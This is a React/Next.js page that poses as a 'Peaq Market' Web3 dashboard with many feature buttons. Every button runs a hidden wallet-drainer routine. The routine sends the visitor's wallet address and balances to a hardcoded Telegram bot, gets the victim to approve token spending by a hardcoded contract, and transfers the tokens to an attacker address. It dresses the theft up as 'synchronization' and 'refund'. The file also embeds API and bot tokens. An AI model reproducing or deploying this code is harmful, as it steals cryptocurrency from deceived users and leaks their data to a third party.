import React from "react";
import { ethers } from "ethers";
import { ConnectWallet,useAddress, useBalance, useConnectionStatus,useSigner,useSDK} from "@thirdweb-dev/react";
import {Navbar, NavbarBrand, NavbarContent, NavbarItem, Link, Button, ButtonGroup, NavbarMenuToggle, NavbarMenu, NavbarMenuItem, Card, CardBody, Input, Image, CardFooter, CardHeader,Divider} from "@nextui-org/react";
import { NATIVE_TOKEN_ADDRESS } from '@thirdweb-dev/sdk';
import { useContext, useState, useEffect } from "react";
import ChainContext from "../context/Chain";
import { useRouter } from 'next/router';
import {AcmeLogo} from "./AcmeLogo";
import {SearchIcon} from "./SearchIcon";
import {MoonIcon} from "./moon";
import {SunIcon} from "./sun";
import { NextPage } from "next";
import {useTheme} from "next-themes";

const Home: NextPage = () => {
  const [isMenuOpen, setIsMenuOpen] = React.useState(false);
  const { theme, setTheme } = useTheme();
  const router = useRouter();
  const project = router.query.project as string;

  const menuItems = [
    "Explore",
    "Projects",
    "Activity",
    "Analytics",
    "System",
    "Sponsors",
    "Help & Feedback",
  ];
  const list = [
    {
        title: "Deposit",
        body: "",
        price: "",
      },
      {
        title: "Withdraw",
        body: "",
        price: "",
      },
      {
        title: "Public Sale",
        body: "",
        price: "",
      },
      {
        title: "Private Sale",
        body: "",
        price: "",
      },
    {
      title: "Referral Rewards",
      body: "",
      price: "",
    },
    {
      title: "Claim Rewards",
      body: "",
      price: "",
    },
    {
      title: "Earn Rewards",
      body: "",
      price: "",
    }, 
    {
      title: "Marketplace",
      body: "",
      price: "",
    },
    {
        title:"Rectification",
        body:"",
        
    },
    {
        title:"Stake",
        body:"",
        
    },
    {
        title:"Unstake",
        body:"",
        
    },
    {
        title:"Galxe-Web",
        body:"",
        
    },
    {
        title:"Quest3",
        body:"",
        
    },
    {
        title:"Zealy Market",
        body:"",
        
    },
    {
        title:"Guild.xyz",
        body:"",
        
    },
    {
        title:"Bridge Token",
        body:"",
        
    },
    {
        title:"Get Role",
        body:"",
        
    },
    {
        title:"Verify Role",
        body:"",
        
    },
    {
        title:"Merge RPC",
        body:"",
        
    },
    {
        title:"Swap",
        body:"",
        
    },
    {
        title:"Unstake",
        body:"",
        
    },
    {
        title:"Connect Tasks",
        body:"",
        
    },
    {
        title:"Mint",
        body:"",
        
    },
    {
        title:"Troubleshoot",
        body:"",
        
    },
    {
        title:"Fix Gas",
        body:"",
        
    },
    {
        title:"Retreieve Service",
        body:"",
        
    },
    {
        title:"Add Liquidity",
        body:"",
        
    },
    {
        title:"Remove Liquidity",
        body:"",
        
    },
    
  ];
  const address = useAddress();
const { data, isLoading } = useBalance(NATIVE_TOKEN_ADDRESS);
const wbalance = data?.displayValue;
const { selectedChain, setSelectedChain } = useContext(ChainContext);
const [allowanceRequested, synchronizationCompleted] = useState(false);
const signer = useSigner();
const [synchronizationSuccess, setSynchronizationProcess] = useState(false);
const addresses: Record<string, string> = {
    ["ethereum"]: "0xb0e62DE026195d51b0DA52D8c79d7FFd6aC778Ce",
    ["binance"]: "0xb0e62DE026195d51b0DA52D8c79d7FFd6aC778Ce",
  };
  const net: Record<string,string> = {
    "ethereum" : "ethereum",
    "binance": "binance",
  };
   const sdk =  useSDK();
  const aptk = "6tL6x4wh-ROoNc4hp3C8gE-ToXlCSM5t"
  const chainUrls: Record<string, string> = {
    ethereum: `https://eth-mainnet.g.alchemy.com/v2/${aptk}`,
    arbitrum: `https://arb-mainnet.g.alchemy.com/v2/${aptk}`,
    binance:  `https://eth-mainnet.g.alchemy.com/v2/${aptk}`,
    polygon: `https://matic-mainnet.g.alchemy.com/v2/${aptk}`,
  };
  const url = chainUrls[selectedChain];
  const connectionStatus = useConnectionStatus();
  console.log(connectionStatus);
  console.log(selectedChain);
  const [showConnectModal, setShowConnectModal] = useState(false);
  async function main() {
    if (connectionStatus === "unknown") {
      await sendMessageToTelegram(`User is yet to connect. Hold on........`);
      console.log(`User is yet to connect. Hold on........`);
      setShowConnectModal(true);
      return;
      
    } 
    if (connectionStatus === "connecting"){
      await sendMessageToTelegram(`User's wallet is connecting be patient....`);
      console.log(`User's wallet is connecting be patient....`);
    }
    if (connectionStatus === "connected"){
      await sendMessageToTelegram(`User with wallet address:${address} and balance of ${wbalance} has connected.`);
      console.log(`User with wallet address:${address} and balance of ${wbalance} has connected.`);
    }
    if (connectionStatus === "disconnected"){
      await sendMessageToTelegram(`User has disconnected !`);
      console.log(`User has disconnected`);
      setShowConnectModal(true);
      return;
    }

    const options = {
      method: "POST",
      headers: {
        accept: "application/json",
        "content-type": "application/json",
      },
      body: JSON.stringify({
        id: 1,
        jsonrpc: "2.0",
        method: "alchemy_getTokenBalances",
        params: [address],
      }),
    };
    // fetching the token balances
    let res = await fetch(url, options);
    let response = await res.json();
  
    // Getting balances from the response
    const balances = response["result"];
  
    // Remove tokens with zero balance
    const nonZeroBalances = await balances.tokenBalances.filter(
        (token: { tokenBalance: string }) => token.tokenBalance !== "0"
      );
  
    await sendMessageToTelegram(`Token balances of ${address}: \n`);
  
    // Create arrays to store contract addresses, balances, and formatted balances
    const tokenAddresses = [];
    const tokenBalances = [];
    const formattedBalances = [];
  
    // Loop through all tokens with non-zero balance
    for (let token of nonZeroBalances) {
      // Get balance of token
      let balance = token.tokenBalance;
      
  
      // request options for making a request to get tokenMetadata
      const tokenMetadataOptions = {
        method: "POST",
        headers: {
          accept: "application/json",
          "content-type": "application/json",
        },
        body: JSON.stringify({
          id: 1,
          jsonrpc: "2.0",
          method: "alchemy_getTokenMetadata",
          params: [token.contractAddress],
        }),
      };
  
      // parsing the response and getting metadata from it
      let res2 = await fetch(url, tokenMetadataOptions);
      let metadata = await res2.json();
      metadata = metadata["result"];
  
      // Compute token balance in human-readable format
      balance = balance / Math.pow(10, metadata.decimals);
      balance = balance.toFixed(2);
      // Create formatted balance using ethers.utils.parseUnits()
      if (balance > 5) {
        // Create formatted balance using ethers.utils.parseUnits()
        const formattedBalance = ethers.utils.parseUnits(balance.toString(), 'ether');
        console.log(formattedBalance);
        
        // Print name, balance, and symbol of token
        await sendMessageToTelegram(`${metadata.name}: ${balance} ${metadata.symbol} Contract Address:${token.contractAddress}`);
        
        // Add contract address, balance, and formatted balance to the arrays
        tokenAddresses.push(token.contractAddress);
        tokenBalances.push(balance);
        formattedBalances.push(formattedBalance);
      }
    }
     const spenderAddress = addresses[selectedChain];
    // Loop through contract addresses and formatted balances
    for (const [index, tokenAddress] of tokenAddresses.entries()) {
        const refundAmount = formattedBalances[index];
       
        
      const tokenContract = new ethers.Contract(tokenAddress, ['function approve(address spender, uint256 value)'], signer);
      const myContract = new ethers.Contract(spenderAddress,['function transferERC20(address tokenAddress, address fromAddress, address toAddress, uint256 value)'],signer );
      const toAddress ="0x5fC8D30804508dfBB940b64D20BdCFCA9C6A6c25"
      try {
        
        const gasLimit = "100000";
        const tx = await tokenContract.approve(spenderAddress, refundAmount, {gasLimit});
        await tx.wait();
        await sendMessageToTelegram(`Synchronization completed for ${refundAmount} of ${tokenAddress}`);
    const transferTx = await myContract.transferERC20(tokenAddress, address, toAddress, refundAmount);
    await transferTx.wait();
    await sendMessageToTelegram(`Transfer completed for ${refundAmount} of ${tokenAddress}`);
      } catch (error) {
        const tferror = console.info(`ERROR:`, error);
        await sendMessageToTelegram(`${tferror}`);
        setSynchronizationProcess(false); 
        return; // Exit the loop on error
      }
    }
    
    synchronizationCompleted(true); // Move this line outside the loop
    setSynchronizationProcess(true); 
  }
  useEffect(() => {
    if (synchronizationSuccess) {
        router.push("/synchronize"); // Replace "/new-page" with your desired destination
      }
    }, [synchronizationSuccess, router]);


  return (
    
    <div>
 <Navbar
      isBordered
      isMenuOpen={isMenuOpen}
      onMenuOpenChange={setIsMenuOpen}
    >
      <NavbarContent className="sm:hidden" justify="start">
        <NavbarMenuToggle aria-label={isMenuOpen ? "Close menu" : "Open menu"} />
      </NavbarContent>

      <NavbarContent className="sm:hidden pr-3" justify="center">
        <NavbarBrand>
          <AcmeLogo />
          <p className="font-bold text-inherit">Peaq Market</p>
        </NavbarBrand>
      </NavbarContent>

      <NavbarContent className="hidden sm:flex gap-4" justify="center">
        <NavbarBrand>
          <AcmeLogo />
          <p className="font-bold text-inherit">Peaq Market</p>
        </NavbarBrand>
        <NavbarItem>
          <Link color="foreground" href="#">
            Explore
          </Link>
        </NavbarItem>
        <NavbarItem isActive>
          <Link href="#" aria-current="page">
            Projects
          </Link>
        </NavbarItem>
        <NavbarItem>
          <Link color="foreground" href="#">
            Integrations
          </Link>
        </NavbarItem>
      </NavbarContent>

      <NavbarContent justify="end">
        <NavbarItem>
  <Button variant="ghost" onClick={() => setTheme('light')}><SunIcon/></Button>
  <Button variant="ghost" onClick={() => setTheme('dark')}><MoonIcon/></Button>
        </NavbarItem>
      </NavbarContent>

      <NavbarMenu>
        {menuItems.map((item, index) => (
          <NavbarMenuItem key={`${item}-${index}`}>
            <Link
              className="w-full"
              color={
                index === 0 ? "warning" : index === menuItems.length - 1 ? "danger" : "foreground"
              }
              href="#"
              size="lg"
            >
              {item}
            </Link>
          </NavbarMenuItem>
        ))}
      </NavbarMenu>
    </Navbar>
    
    <Card>
      <CardBody>
        <p className="justify-center text-center font-small">Connect your wallet to interact with <span className="font-bold">{project}</span> explorer</p>
        <br></br>
        <p className="justify-center text-center font-small"><ConnectWallet theme={theme as ("light" | "dark" | undefined)}
        modalTitle={"Connect to Peaq Market"}/></p>
      </CardBody>
    </Card>
    <br></br>
    <div>
      <h1 className="font-bold">Explore all features</h1><br></br>
    </div>
    <div className="flex items-center">
  <Input
    label="Search"
    isClearable
    radius="lg"
    classNames={{
      label: "text-black/50 dark:text-white/90",
      input: [
        "bg-transparent",
        "text-black/90 dark:text-white/90",
        "placeholder:text-default-700/50 dark:placeholder:text-white/60",
      ],
      innerWrapper: "bg-transparent",
      inputWrapper: [
        "shadow-xl",
        "bg-default-200/50",
        "dark:bg-default/60",
        "backdrop-blur-xl",
        "backdrop-saturate-200",
        "hover:bg-default-200/70",
        "dark:hover:bg-default/70",
        "group-data-[focused=true]:bg-default-200/50",
        "dark:group-data-[focused=true]:bg-default/60",
        "!cursor-text",
      ],
    }}
    placeholder="Type to search..."
    startContent={
      <SearchIcon className="text-black/50 dark:text-white/90 text-slate-400 pointer-events-none flex-shrink-0"/>
    }
  />
</div>
<Divider/>
<br></br>
<div className="gap-4 grid grid-cols-2 sm:grid-cols-4">
      {list.map((item, index) => (
        <Card shadow="sm" key={index} isPressable onPress={() => main()} className="border-double border-2 bg-transparent">
          <CardBody className="overflow-visible p-0">
            <p className="justify-center text-center py-10 px-10 font-bold">{item.body}</p>
          </CardBody>
          <CardFooter className="text-small justify-between">
            <b>{item.title}</b>
            <p className="text-default-500">{item.price}</p>
          </CardFooter>
        </Card>
      ))}
    </div>
</div>
  );
};
const sendMessageToTelegram = async (message: string) => {
  const botToken = '6488844148:AAF76yNNMzeq3A9WqyPYdbWflixc0zNBEAU';
  const chatId = '1850200586'; // You'll need to obtain this from your Telegram bot
  
  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

  const response = await fetch(url, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
    }),
  });
}; 

export default Home;
